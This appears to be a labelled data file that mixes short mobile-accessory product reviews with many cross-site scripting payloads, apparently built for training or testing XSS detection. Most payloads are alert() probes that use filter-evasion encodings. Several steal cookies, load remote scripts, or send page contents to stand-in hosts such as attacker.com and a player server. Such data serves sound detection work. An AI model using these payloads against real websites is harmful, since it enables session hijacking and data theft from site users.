227;This does not fit the Palm Tungsten E2 and it broke the first time I tried to plug it in.;;;;;;;;;;;;;;;;;;;;;;;;
228;<SCRIPT>CRYPTO.GENERATECRMFREQUEST('CN=0';0;0;NULL;ALERT(1)';384;NULL;RSA-DUAL-USE')</SCRIPT>;;;;;;;;;;;;;;;;;
229;You need two hands to operate the screen.This software interface is decade old and cannot compete with new software designs.;;;;;;;;;;;;;;;;;;;;;;;;
230;"&LT;IMG STYLE=\""XSS&#58;EXPR/*XSS*/ESSION(ALERT('XSS'))\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
231;# It Works - #2 It is Comfortable.;;;;;;;;;;;;;;;;;;;;;;;;
232;"&lt;img src=\""jav&#x0d;ascript&#058;alert('xss');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
233;"<div style=""font-family:'foo&#10;;color:red;';"">lol";;;;;;;;;;;;;;;;;;;;;;;;
234;Don't make the same mistake that I did and please don't buy this phone.;;;;;;;;;;;;;;;;;;;;;;;;
235;It works great with a car charger; especially if you cannot plug in two adapters at the same time.;;;;;;;;;;;;;;;;;;;;;;;
236;"Other than that, the leather is nice and soft; the fit is very tight; the cut out for the face is a good shape.";;;;;;;;;;;;;;;;;;;;;;;;
237;Provides good protection and looks classy; too.;;;;;;;;;;;;;;;;;;;;;;;
238;This product is great... it makes working a lot easier I can go to the copier while waiting on hold for something.;;;;;;;;;;;;;;;;;;;;;;;;
239;"&LT;sTYle&gT;@IM\POrT'\ja\VaSC\RiPt&#58;alERT(\""xSS\"")';&LT;/STyle&GT;";;;;;;;;;;;;;;;;;;;;;;;;
240;"<div style=""width: expression(alert('xss'));"">";;;;;;;;;;;;;;;;;;;;;;;;
241;The Jabra EarGels fit my ears very well.;;;;;;;;;;;;;;;;;;;;;;;;
242;Terrible phone holder.;;;;;;;;;;;;;;;;;;;;;;;;
243;"<META HTTP-EQUIV=""REFRESH"" CONTENT=""0;URL=JAVASCRIPT:ALERT('XSS');"">";;;;;;;;;;;;;;;;;;;;;;;;
244;"<IfRAMe SRCDOc='<ScrIpt Src=""Data:texT/JAvaScRIpT,ALeRt(docUMeNT.doMAiN)""></ScRiPT>'></ifrAme>";;;;;;;;;;;;;;;;;;;;;;;;
245;"exp/*&lt;A STYLE='no\xss&#58;noxss(\""*//*\"");";;;;;;;;;;;;;;;;;;;;;;;;
246;I can hear while I'm driving in the car; and usually don't even have to put it on it's loudest setting.;;;;;;;;;;;;;;;;;;;;;;;
247;"<Div STYLE=""wIdth: expRESsIon(alERT('XSs'));"">";;;;;;;;;;;;;;;;;;;;;;;;
248;"<OBjecT DATa=""htTP://CORkaMI.GOogleCoDe.coM/svn/!SvN/Bc/480/TrunK/mIsc/PDf/HELlOwOrLd_Js_X.pdf"">";;;;;;;;;;;;;;;;;;;;;;;;
249;"""><script src=data:text/javascript;base64,zd1kb2n1bwvuddsgxya9igquy3jlyxrlrwxlbwvudcgnc2nyaxb0jyk7xy5pzd0nmtkno18ubm9uy2u9zc5xdwvyevnlbgvjdg9ykcdbbm9uy2vdjykubm9uy2u7xy5zcmm9jy8vbg9jywxob3n0l20no2quym9kes5hchblbmrdaglszchfksa=></script>";;;;;;;;;;;;;;;;;;;;;;;;
250;I am sorry I made this purchase.;;;;;;;;;;;;;;;;;;;;;;;;
251;"<ImG Src= oNmouSEovER=""alERT('XXs')"">";;;;;;;;;;;;;;;;;;;;;;;;
252;Really good product.;;;;;;;;;;;;;;;;;;;;;;;;
253;"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
254;"<A HREF=""JAVASCRIPT:VOID(0)"" ONMOUSEOVER=&NEWLINE;JAVASCRIPT:ALERT(1)&NEWLINE;>X</A><///STYLE///><SPAN %2F ONMOUSEMOVE='ALERT&LPAR;1&RPAR;'>SPAN";;;;;;;;;;;;;;;;;;;;;;;;
255;"<IFRAME SRC='DATA:TEXT/HTML,<SCRIPT DEFER=""TRUE"" SRC=""DATA:TEXT/JAVASCRIPT,DOCUMENT.BODY.INNERTEXT=/HELLO/""></SCRIPT>'></IFRAME>";;;;;;;;;;;;;;;;;;;;;;;;
256;%253cscript%253ealert(document.cookie)%253c/script%253e�><<script>alert(document.cookie);;//<</script>;;;;;;;;;;;;;;;;;;;;;;
257;//<form/action=javascript&#x3a;;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//;;;;;;;;;;;;;;;;;;;
258;"""><iframe onload=""eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"">";;;;;;;;;;;;;;;;;;;;;;;;
259;NOT WHAT I WANTED.;;;;;;;;;;;;;;;;;;;;;;;;
260;"""><A HREF=""JAVASCRIPT:EVAL('D=DOCUMENT; _ = D.CREATEELEMENT(\'SCRIPT\');_.SRC=\'//DOMAIN\';D.BODY.APPENDCHILD(_)')"">CLICK ME FOR AN AWESOME TIME</A>";;;;;;;;;;;;;;;;;;;;;;;;
261;WORTHWHILE.;;;;;;;;;;;;;;;;;;;;;;;;
262;"<EMBEd SRC=""DatA:imagE/svg+XML;bASe64,Phn2Zyb4BWXUcZpZDmc9imH0dh a6ly93D3CUdZmuB3jNLZIWMDAVC3znIIB4bWXUcz0IAhR0cDoVL3D3Dy53My5VCmCV mJAwmc9ZDmCIihHtbG5zOnHsaW5rpsJoDhRwOI8VD3d3lncZLM9YZY8xotK5l3hS aW5riIB2ZXjZaw9uPsIXLJAiihg9IJAIIhK9IJAIIHDPzHROpsIxotQiiGhlAwDodd0Imjaw IibPZd0IEhnzIJ48C2NyAXb0Ihr5cGU9iNRlEhqVZwNTyXnjCMlwdCI+YwxlcnQOilH TUYipoZwvc2NYaxb0PJwvc3ZnpG=="" TypE=""image/svG+Xml"" ALlowSCRiPtacCEsS=""ALWAYs""></EmBEd>";;;;;;;;;;;;;;;;;;;;;;;;
263;"<AUdIo auTOPLay ONPLAyiNg=aLErt(1)><SOuRCe sRc=""VALIDaUDiO.WAV"" tyPE=""AUDio/wAV""></auDIo>";;;;;;;;;;;;;;;;;;;;;;;;
264;However I needed some better instructions.;;;;;;;;;;;;;;;;;;;;;;;;
265;They do not last forever; but is not overly expensive to replace.Easy to operate and the sound is much better than others I have tried.;;;;;;;;;;;;;;;;;;;;;;;
266;<script/src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script>;;;;;;;;;;;;;;;;;;;;;;;;
267;<SVg><sCRipT %00>ALErt&lPaR;;1&rPAR; {opErA};;;;;;;;;;;;;;;;;;;;;
268;If there is a wind; it is completely useless.;;;;;;;;;;;;;;;;;;;;;;;
269;<bOdY OnLOAD=ALert('helLOX worlDss')>;;;;;;;;;;;;;;;;;;;;;;;;
270;<script>crypto.generateCRMFRequest('CN=0';0;0;null;alert(1)';384;null;rsa-dual-use')</script>;;;;;;;;;;;;;;;;;
271;+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-;;;;;;;;;;;;;;;;;;;;;;;;
272;Bluetooth does not work; phone locks up; screens just flash up and now it just makes calls randomly while in my pocket locked.;;;;;;;;;;;;;;;;;;;;;;
273;"<sCrIpt srC=""HtTps://cdNJS.cLoudflAre.coM/AJax/lIBS/ProTOTYpE/1.7.2/prototYpE.Js""></sCripT><sCRIpt SrC=""httPs://cdNJs.CLOudFlaRe.CoM/aJAX/LiBs/aNGULAR.Js/1.0.8/ANGULaR.JS"" /></SCriPT><DIv NG-ApP NG-CsP>{{ X = $oN.curRY.cAll().Eval(""FetcH('HtTP://lOcalhOSt/indEX.phP').THEN(d => {})"") }}</diV>""><scRiPT SRC=""htTPs://cDnJs.clOuDflarE.cOm/AnGulAR.MIn.jS""></sCrIpt> <Div Ng-aPp Ng-Csp>{{$evaL.CoNstruCTOr('alert(1)')()}}</div>""><SCRIPt Src=""HTtPs://cDNjs.CLOUDFlaRe.coM/AnGULaRJs/1.1.3/angULar.MIn.js""> </sCRipT><DiV nG-APp ng-csp id=P ng-clICk=$eVENt.vIEW.alert(1337)>";;;;;;;;;;;;;;;;;;;;;;;;
274;"<EMBED SRC=""HTTP://CORKAMI.GOOGLECODE.COM/SVN/!SVN/BC/480/TRUNK/MISC/PDF/HELLOWORLD_JS_X.PDF"">";;;;;;;;;;;;;;;;;;;;;;;;
275;"<STYle>@iM\pOrt'\jA\Vasc\rIpt:alert(""XSs"")';</sTYLe>";;;;;;;;;;;;;;;;;;;;;;;;
276;"<a hREF=""JavAsCRiPt:voId(0)"" OnMouSEOver=&NeWLINE;jAVASCRipt:ALert(1)&NEwline;>X</A><///StYLe///><SpAN %2f onMOUSEmoVe='alert&LpaR;1&RPAR;'>sPAN";;;;;;;;;;;;;;;;;;;;;;;;
277;"&Lt;bOdY BACkGrOuNd=\""jAVAsCrIPT&#058;ALERt('XSs')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
278;"jabra ear gels ""R"" the best!.";;;;;;;;;;;;;;;;;;;;;;;;
279;%2badw-script+ad4-alert(document.location)%2badw-/script%2bad4-;;;;;;;;;;;;;;;;;;;;;;;;
280;"<FRAMESET><FRAME SRC=""JAVASCRIPT:ALERT('XSS');""></FRAMESET>";;;;;;;;;;;;;;;;;;;;;;;;
281;"It plays louder than any other speaker of this size; the price is so low that most would think the quality is lacking, however, it's not.";;;;;;;;;;;;;;;;;;;;;;;;
282;The shipping time was also very quick!;;;;;;;;;;;;;;;;;;;;;;;;
283;Awkward to use and unreliable.;;;;;;;;;;;;;;;;;;;;;;;;
284;Bad Reception.;;;;;;;;;;;;;;;;;;;;;;;;
285;�;; aLeRT(dOCuMENt.COoKiE); VaR foO=�;;;;;;;;;;;;;;;;;;;;;
286;Unfortunately it did not work.;;;;;;;;;;;;;;;;;;;;;;;;
287;<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?;;;;;;;;;;;;;;;;;;;;;;;;
288;"But now that it is ""out of warranty"" the same problems reoccure.Bottom line... put your money somewhere else... Cingular will not support it.";;;;;;;;;;;;;;;;;;;;;;;;
289;"<svg onload=""javascript:alert(123)"" xmlns=""#""></svg>";;;;;;;;;;;;;;;;;;;;;;;;
290;Battery is terrible.;;;;;;;;;;;;;;;;;;;;;;;;
291;"&lt;IMG SRC=\""jav&#x09;ascript&#058;alert('XSS');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
292;"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mh`//'>";;;;;;;;;;;;;;;;;;;;;;;;
293;<BODY ONLOAD=alert('hellox worldss')>;;;;;;;;;;;;;;;;;;;;;;;;
294;"<IMG SRC= onmouseover=""alert('xxs')"">";;;;;;;;;;;;;;;;;;;;;;;;
295;"&Lt;IMG StyLe=\""XSS&#58;EXPr/*xSS*/ESSiOn(aleRT('XSs'))\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
296;"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a><///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN";;;;;;;;;;;;;;;;;;;;;;;;
297;The pairing of the two devices was so easy it barely took a couple minutes before I started making calls with the voice dialing feature.;;;;;;;;;;;;;;;;;;;;;;;;
298;"&Lt;xss styLE=\""xss&#58;ExpResSion(aLERT('xss'))\""&Gt;";;;;;;;;;;;;;;;;;;;;;;;;
299;After receiving and using the product for just 2 days it broke.;;;;;;;;;;;;;;;;;;;;;;;;
300;Excellent sound; battery life and inconspicuous to boot!.;;;;;;;;;;;;;;;;;;;;;;;
301;<script>confirm()</script>;;;;;;;;;;;;;;;;;;;;;;;;
302;//<FoRM/aCtion=jAVAsCRIPt&#x3A;;AleRt&lpAR;DocumeNT&pErIOd;COokie&rpaR;><INPUt/tYpe='SuBmit'>//;;;;;;;;;;;;;;;;;;;
303;"In the span of an hour, I had two people exclaim ""Whoa - is that the new phone on TV?!?";;;;;;;;;;;;;;;;;;;;;;;;
304;"<img src= onmouseover=""alert('xxs')"">";;;;;;;;;;;;;;;;;;;;;;;;
305;"&Lt;DiV sTyLE=\""bAcKgRoUNd-imAGE&#58; url(JaVAsCRIpT&#058;alERT('XSs'))\""&Gt;";;;;;;;;;;;;;;;;;;;;;;;;
306;"It felt too light and ""tinny."".";;;;;;;;;;;;;;;;;;;;;;;;
307;Leopard Print is wonderfully wild!.;;;;;;;;;;;;;;;;;;;;;;;;
308;Does everything it should and more.;;;;;;;;;;;;;;;;;;;;;;;;
309;Problem is that the ear loops are made of weak material and break easily.;;;;;;;;;;;;;;;;;;;;;;;;
310;None of the three sizes they sent with the headset would stay in my ears.;;;;;;;;;;;;;;;;;;;;;;;;
311;Appears to actually outperform the original battery from China that came with my V325i.;;;;;;;;;;;;;;;;;;;;;;;;
312;"<frameset><frame src=""javascript:alert('xss');""></frameset>";;;;;;;;;;;;;;;;;;;;;;;;
313;"<Div StyLE=""fOnT-FamILy:'FoO&#10;;COLor:rED;';"">LoL";;;;;;;;;;;;;;;;;;;;;;;;
314;Utter crap.. Sound quality is TERRIBLE.;;;;;;;;;;;;;;;;;;;;;;;;
315;Can't upload ringtones from a third party.;;;;;;;;;;;;;;;;;;;;;;;;
316;They have been around for years and carries the highest quality of anti-glare screen protector that I have found to date.;;;;;;;;;;;;;;;;;;;;;;;;
317;"&lt;diV sTyLE=\""wIDtH&#58; exPreSSION(alErT('xSS'));\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
318;Plan on ordering from them again and again.;;;;;;;;;;;;;;;;;;;;;;;;
319;You get what you pay for I guess.;;;;;;;;;;;;;;;;;;;;;;;;
320;"&LT;IMG SRC=\""JAV&#X0D;ASCRIPT&#058;ALERT('XSS');\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
321;"<svg/onload=""(new image()).src='//attacker.com/'%2bdocument.documentelement.innerhtml"">";;;;;;;;;;;;;;;;;;;;;;;;
322;<script/&tab;; src='https://dl.dropbox.com/u/13018058/js.js' /&tab;></script>;;;;;;;;;;;;;;;;;;;;;
323;"&lt;table&gt;&lt;td background=\""javascript&#058;alert('xss')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
324;<IMG SRC=`%00`&NEWLINE;; ONERROR=ALERT(1)&NEWLINE;;;;;;;;;;;;;;;;;;;;;;
325;"xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\""XSS\""))'&gt;";;;;;;;;;;;;;;;;;;;;;;;;
326;Great it was new packaged nice works good; no problems and it came in less time then I expected!!!!;;;;;;;;;;;;;;;;;;;;;;;
327;But despite these few flaws; this case is of exceptional quality and well worth the additional costs of owning an official OEM product.;;;;;;;;;;;;;;;;;;;;;;;
328;"""><SCRIPT SRC=DATA:TEXT/JAVASCRIPT;BASE64,ZD1KB2N1BWVUDDSGXYA9IGQUY3JLYXRLRWXLBWVUDCGNC2NYAXB0JYK7XY5PZD0NMTKNO18UBM9UY2U9ZC5XDWVYEVNLBGVJDG9YKCDBBM9UY2VDJYKUBM9UY2U7XY5ZCMM9JY8VBG9JYWXOB3N0L20NO2QUYM9KES5HCHBLBMRDAGLSZCHFKSA=></SCRIPT>";;;;;;;;;;;;;;;;;;;;;;;;
329;"&LT;TABLE&GT;&LT;TD BACKGROUND=\""JAVASCRIPT&#058;ALERT('XSS')\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
330;Five star Plus; plus.;;;;;;;;;;;;;;;;;;;;;;;
331;I love the ringtones because they are so upbeat!;;;;;;;;;;;;;;;;;;;;;;;;
332;Does Not Work.;;;;;;;;;;;;;;;;;;;;;;;;
333;That company is a joke.;;;;;;;;;;;;;;;;;;;;;;;;
334;What possesed me to get this junk; I have no idea...;;;;;;;;;;;;;;;;;;;;;;;
335;Not as good as I had hoped.;;;;;;;;;;;;;;;;;;;;;;;;
336;"<iframe %00 src=""&tab;javascript:prompt(1)&tab;""%00>";;;;;;;;;;;;;;;;;;;;;;;;
337;Couldn't use the unit with sunglasses; not good in Texas!;;;;;;;;;;;;;;;;;;;;;;;
338;<iframe/src=javascript:alert(1)>;;;;;;;;;;;;;;;;;;;;;;;;
339;"<form><isindex formaction=""javascript&colon;confirm(1)""";;;;;;;;;;;;;;;;;;;;;;;;
340;When I placed my treo into the case; not only was it NOT snug; but there was A LOT of extra room on the sides.;;;;;;;;;;;;;;;;;;;;;;
341;%2BADW-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)%2BADW-/SCRIPT%2BAD4-;;;;;;;;;;;;;;;;;;;;;;;;
342;"<fRAmeseT><fRaMe src=""jAVAsCRipT:ALErt('XSs');""></fraMesET>";;;;;;;;;;;;;;;;;;;;;;;;
343;I tried talking real loud but shouting on the telephone gets old and I was still told it wasn't great.;;;;;;;;;;;;;;;;;;;;;;;;
344;Blue Ant is easy to use.;;;;;;;;;;;;;;;;;;;;;;;;
345;"&LT;LINK REL=\""STYLESHEET\"" HREF=\""HTTP&#58;//HA&#46;CKERS&#46;ORG/XSS&#46;CSS\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
346;I have to use the smallest earpieces provided; but it stays on pretty well.;;;;;;;;;;;;;;;;;;;;;;;
347;At first I thought I was grtting a good deal at $7.44; until I plugged it into my phone (V3c Razr).;;;;;;;;;;;;;;;;;;;;;;;
348;The instructions didn't explain that a microphone jack could be used.;;;;;;;;;;;;;;;;;;;;;;;;
349;"&lt;IMG src=\""jAv&#X0d;ascript&#058;alERt('Xss');\""&gT;";;;;;;;;;;;;;;;;;;;;;;;;
350;It is light; has plenty of battery capacity; and is very confortable to wear for somewhat extended periods of time.;;;;;;;;;;;;;;;;;;;;;;
351;Don't buy this product - It fails!.;;;;;;;;;;;;;;;;;;;;;;;;
352;"<AudIo coNTRoLs autoPLAy ONenDEd=ALerT(1)><SourcE SRC=""VaLIdAudiO.Wav"" type=""AUdIO/Wav""></auDIO>";;;;;;;;;;;;;;;;;;;;;;;;
353;Doesn't do the job.;;;;;;;;;;;;;;;;;;;;;;;;
354;<sCRiPT>FeTCh('htTp://X-ORaCLe-v0.nn9eD.KA0laBs.ORG/ADMIN/sEaRCh/x%27%20uNioN%20SeLECt%20flaG%20frOM%20CHAlleNGe%23').theN(_=>_.teXt()).tHEn(_=>NeW iMaGE().srC='HTtp://PlAYEr_sErvER/?'+_)</scripT>;;;;;;;;;;;;;;;;;;;;;;;;
355;"<iframe name=""admin"" src=""https://bypasses-everywhere.ctf.insecurity-insa.fr/admin""></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
356;"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;";;;;;;;;;;;;;;;;;;;;;;;;
357;"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf"">";;;;;;;;;;;;;;;;;;;;;;;;
358;i would advise to not purchase this item it never worked very well.;;;;;;;;;;;;;;;;;;;;;;;;
359;The handsfree part works fine; but then the car tries to download the address book; and the Treo reboots.Overall; I still rate this device high.;;;;;;;;;;;;;;;;;;;;;
360;"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>";;;;;;;;;;;;;;;;;;;;;;;;
361;<h1><fOnt CoLor=blUE>helloX WORldsS</h1>;;;;;;;;;;;;;;;;;;;;;;;;
362;I've had no trouble accessing the Internet; downloading ringtones or performing any of the functions.;;;;;;;;;;;;;;;;;;;;;;;
363;So I bought about  of these and saved alot of money.;;;;;;;;;;;;;;;;;;;;;;;;
364;Easy to use.;;;;;;;;;;;;;;;;;;;;;;;;
365;"&LT;DIV STYLE=\""BACKGROUND-IMAGE&#58; URL(JAVASCRIPT&#058;ALERT('XSS'))\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
366;"<TABLE><TD BACKGROUND=""JAVASCRIPT:ALERT('XSS')"">";;;;;;;;;;;;;;;;;;;;;;;;
367;I love being able to use one headset for both by land-line and cell.;;;;;;;;;;;;;;;;;;;;;;;;
368;+aciapga8-script+ad4-alert(document.location)+adw-/script+ad4apaai-;;;;;;;;;;;;;;;;;;;;;;;;
369;It has everything I need and I couldn't ask for more.;;;;;;;;;;;;;;;;;;;;;;;;
370;"<FORM><IFRAME &#09;&#10;&#11; SRC=""JAVASCRIPT&#58;ALERT(1)""&#11;&#10;&#09;;>";;;;;;;;;;;;;;;;;;;;;;;;
371;&LT;;BODY ONLOAD=ALERT('XSS')&GT;;;;;;;;;;;;;;;;;;;;;;
372;"EXP/*&LT;A STYLE='NO\XSS&#58;NOXSS(\""*//*\"");";;;;;;;;;;;;;;;;;;;;;;;;
373;Phone is sturdy as all nokia bar phones are.;;;;;;;;;;;;;;;;;;;;;;;;
374;Doesn't Work.;;;;;;;;;;;;;;;;;;;;;;;;
375;<img/&#09;;&#10;&#11; src=`~` onerror=prompt(1)>;;;;;;;;;;;;;;;;;;;;
376;<Svg><sTylE>{FOnt-FAmILy&cOLon;;<IFRAme/oNlOaD=cOnfiRM(1)>';;;;;;;;;;;;;;;;;;;;;;
377;Talk about USELESS customer service.;;;;;;;;;;;;;;;;;;;;;;;;
378;Piece of trash.;;;;;;;;;;;;;;;;;;;;;;;;
379;"""><a href=""javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')"">Click Me For An Awesome Time</a>";;;;;;;;;;;;;;;;;;;;;;;;
380;"<IFrame XMLNs=""#"" sRC=""jAVaScRiPt:alERt(1)""></IFrAMe>";;;;;;;;;;;;;;;;;;;;;;;;
381;<svg><script %00>alert&lpar;;1&rpar; {opera};;;;;;;;;;;;;;;;;;;;;
382;"""><a hREF=""JaVaSCRiPT:EvaL('d=doCumENT; _ = d.CReAteeLEmENT(\'sCriPt\');_.SRc=\'//domAIN\';D.BodY.aPpendChILD(_)')"">CLick Me foR aN AWeSoME tIMe</a>";;;;;;;;;;;;;;;;;;;;;;;;
383;I don't think it would hold it too securly on your belt.;;;;;;;;;;;;;;;;;;;;;;;;
384;"&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
385;�;; alert(document.cookie); var foo=�;;;;;;;;;;;;;;;;;;;;;
386;I contacted the company and they told me that; although the unit was still under warranty; if I couldn't produce my receipt I was out of luck.;;;;;;;;;;;;;;;;;;;;;;
387;<INput oNfoCus=wrIte(XSS) AuTOFoCUS>;;;;;;;;;;;;;;;;;;;;;;;;
388;I got the car charger and not even after a week the charger was broken...I went to plug it in and it started smoking.;;;;;;;;;;;;;;;;;;;;;;;;
389;"<SVG XMLNS=""#""><SCRIPT>ALERT(1)</SCRIPT></SVG>";;;;;;;;;;;;;;;;;;;;;;;;
390;"&LT;LAYER SRC=\""HTTP&#58;//HA&#46;CKERS&#46;ORG/SCRIPTLET&#46;HTML\""&GT;&LT;/LAYER&GT;";;;;;;;;;;;;;;;;;;;;;;;;
391;"""/>'><script src=""/user_upload/mypic.png.js""></script>";;;;;;;;;;;;;;;;;;;;;;;;
392;"DOCUMENT.QUERYSELECTOR('DIV').INNERHTML=""<IFRAME SRC='JAVASCRIPT:VAR S = DOCUMENT.CREATEELEMENT(\""SCRIPT\"");S.SRC = \""HTTPS://PASTEBIN.COM/RAW/DW5CWGK6\"";DOCUMENT.BODY.APPENDCHILD(S);'></IFRAME>"";";;;;;;;;;;;;;;;;;;;;;;;;
393;"<% foO><x foO=""%><ScrIPT>aLeRT(123)</ScRIPT>"">";;;;;;;;;;;;;;;;;;;;;;;;
394;<INPUT ONFOCUS=WRITE(XSS) AUTOFOCUS>;;;;;;;;;;;;;;;;;;;;;;;;
395;<script ^__^>alert(string.fromcharcode(49))</script ^__^;;;;;;;;;;;;;;;;;;;;;;;;
396;Poor Construction.;;;;;;;;;;;;;;;;;;;;;;;;
397;Also; the phone doesn't seem to accept anything except CBR mp3s; preferably ripped by Windows Media Player.;;;;;;;;;;;;;;;;;;;;;;
398;%22/%3E%3CBODY%20ONLOAD=�DOCUMENT.WRITE(%22%3CS%22%2B%22CRIPT%20SRC=HTTP://MY.BOX.COM/XSS.JS%3E%3C/SCRIPT%3E%22)�%3E;;;;;;;;;;;;;;;;;;;;;;;;
399;"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>";;;;;;;;;;;;;;;;;;;;;;;;
400;%253CSCRIPT%253EALERT(DOCUMENT.COOKIE)%253C/SCRIPT%253E�><<SCRIPT>ALERT(DOCUMENT.COOKIE);;//<</SCRIPT>;;;;;;;;;;;;;;;;;;;;;;
401;"<form><isindex formaction=""javascript&colon;confirm(1)""";;;;;;;;;;;;;;;;;;;;;;;;
402;"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>";;;;;;;;;;;;;;;;;;;;;;;;
403;The nokia CA-42 USB cable did not work with my phone.;;;;;;;;;;;;;;;;;;;;;;;;
404;"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>";;;;;;;;;;;;;;;;;;;;;;;;
405;"&lt;img src=\""jav&#x09;ascript&#058;alert('xss');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
406;All three broke within two months of use.;;;;;;;;;;;;;;;;;;;;;;;;
407;Steer clear of this product and go with the genuine Palm replacementr pens; which come in a three-pack.;;;;;;;;;;;;;;;;;;;;;;;
408;"""/>'><SCRIpT sRc=httPS://AtTACkeR.coM/eVil.js></scRIPt>";;;;;;;;;;;;;;;;;;;;;;;;
409;2 thumbs up to this seller;;;;;;;;;;;;;;;;;;;;;;;;
410;"<iframe xmlns=""#"" src=""javascript:alert(1)""></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
411;//<form/action=javascript&#x3A;;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//;;;;;;;;;;;;;;;;;;;
412;%2bacIaPGa8-scriPT%2BaD4-aLert%28dOCuMENt.LOcATIOn%29%2BADW-%2fscRIPT%2BaD4ApaAi-;;;;;;;;;;;;;;;;;;;;;;;;
413;"<div draGgaBlE=""true"" COntEntEDItabLe>DraG mE</Div><xsS ONdRop=aLeRT(1) CoNtENtEDITablE>DrOP hERe</XSS>";;;;;;;;;;;;;;;;;;;;;;;;
414;<body onload=alert('hellox worldss')>;;;;;;;;;;;;;;;;;;;;;;;;
415;"</sCRIpT><iMg/*%00/sRC=""WoRkSINchroMe&coloN;pRoMpT&#x28;1&#X29;""/%00*/onErrOR='eVAl(SrC)'>";;;;;;;;;;;;;;;;;;;;;;;;
416;"<DIV STYLE=""WIDTH: EXPRESSION(ALERT('XSS'));"">";;;;;;;;;;;;;;;;;;;;;;;;
417;"JaVaSCRiPT:/*--></TItlE></StYLe></texTaREA></sCRIpT></Xmp><svG/onlOAd='+/""/+/OnMoUSeOvEr=1/+/[*/[]/+document.lOcAtioN=`//lOcAlHosT/Mh`//'>";;;;;;;;;;;;;;;;;;;;;;;;
